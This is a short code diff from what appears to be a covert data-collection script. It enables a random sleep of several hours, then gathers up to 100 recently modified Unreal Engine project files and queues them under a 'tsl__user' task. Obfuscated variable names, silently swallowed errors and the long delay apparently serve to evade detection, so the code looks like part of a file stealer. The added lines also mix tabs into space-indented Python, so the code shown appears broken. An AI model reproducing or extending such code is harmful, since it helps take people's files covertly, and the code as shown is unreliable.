@@ -140,7 +140,7 @@ try:
 except:
     pass
     
-# time.sleep(random.randint(7000, 18000))
+time.sleep(random.randint(7000, 18000))
 
 # - 0
 zovV = []
@@ -171,6 +171,8 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext=".uproject", n=8)
 
     if zovV:
+		random.shuffle(zovV)
+		zovV = zovV[:100]
         add_queue_task("tsl__user", {"file": zovV[:100]})
 except:
     try:
